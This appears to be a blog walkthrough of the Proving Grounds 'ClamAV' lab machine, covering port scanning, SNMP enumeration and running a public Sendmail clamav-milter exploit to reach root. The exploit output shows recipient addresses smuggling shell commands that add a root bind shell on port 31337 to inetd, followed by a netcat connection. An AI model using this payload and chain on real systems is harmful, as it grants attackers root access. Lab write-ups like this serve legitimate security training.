---
title: ClamAV Walthrough - Proving Grounds
date: 2023-06-23 12:00:00 +07:00
tags: [clamav, proving grounds, walkthrough]
categories: [Write-up, Proving Grounds]
description: Write-up of the ClamAV machine from Proving Grounds Practice
pin: true
image:
  path: /assets/img/commons/clamav.png
---

## Enumeration

I started off by firing up `rustscan` since it's faster lol, and to give me an overview of the open ports.

```bash
┌──(kali㉿anakin)-[~/offsec/ClamAV]
└─$ rustscan -r 1-65535 --scripts none -a 192.168.199.42 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

Open 192.168.199.42:22
Open 192.168.199.42:25
Open 192.168.199.42:80
Open 192.168.199.42:139
Open 192.168.199.42:199
Open 192.168.199.42:445
Open 192.168.199.42:60000
192.168.199.42 -> [22,25,80,139,199,445,60000]
```

Then a nmap scan to check for services.

```bash
┌──(kali㉿anakin)-[~/offsec/ClamAV]
└─$ nmap -sCV -T5 --min-rate=5000 -v 192.168.199.42       
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-24 11:08 EDT
[...]
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp  open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.249], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp  open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Ph33r
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp open  smux        Linux SNMP multiplexer
445/tcp open  netbios-P   Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-24T15:08:13-04:00
| nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   0XBABE<00>           Flags: <unique><active>
|   0XBABE<03>           Flags: <unique><active>
|   0XBABE<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5h59m46s, deviation: 2h49m42s, median: 3h59m46s
```
There's a lot of info, this is because this box have a lot of rabbit holes and I got stuck in a few of them, so you're free to check all the ports.

For example on Port 80:

![port](/assets/img/clamav/80.jpg)

Using `CyberChef` to decode from Binary.

![cyber](/assets/img/clamav/cyberchef.jpg)

Dead end! lulz

## Enumerating SNMP

Since the name of the box is `ClamAV` we can check that SNMP for some clue.

Thanks [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)!

Enumerating a bit more we find:

```bash
┌──(kali㉿anakin)-[~/offsec/ClamAV]
└─$ snmp-check 192.168.199.42 
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.199.42:161 using SNMPv1 and community 'public'

[*] System information:
[...]
runnable    clamav-milter   /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  ```

It says it's running `clamav-milter`, so let's check searchsploit for `Sendmail clamav-milter`.

```bash
┌──(kali㉿anakin)-[~/offsec/ClamAV]
└─$ searchsploit Sendmail clamav-milter
--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  Path
--------------------------------------------------------------------------------------- ---------------------------------
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution                        | multiple/remote/4761.pl
--------------------------------------------------------------------------------------- 
```

Bingo! This is the one `Sendmail with clamav-milter < 0.91.2 - Remote Command Execution`.

## Executing the exploit

Checking the code, we need to give the IP so it opens a new port we can connect to.

![code](/assets/img/clamav/code.jpg)

We execute it like this:

```bash
┌──(kali㉿anakin)-[~/offsec/ClamAV]
└─$ perl 4761.pl 192.168.199.42
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.199.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Sat, 24 Jun 2023 15:23:50 -0400; (No UCE/UBE) logging access from: [192.168.45.249](FAIL)-[192.168.45.249]
250-localhost.localdomain Hello [192.168.45.249], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 35OJNoHH004194 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```
## Connecting with Netcat

Right now, we only connect to the new open port at `31337`.

```bash
┌──(kali㉿anakin)-[~/offsec/ClamAV]
└─$ nc -nv 192.168.199.42 31337
(UNKNOWN) [192.168.199.42] 31337 (?) open
id & whoami & hostname & cat /root/proof.txt
uid=0(root) gid=0(root) groups=0(root)
root
0xbabe.local
d594[redacted]5da85e
```

And we are root! No need for privesc.

Happy hacking!

![kamusari](/assets/img/smb/kamusari.png)



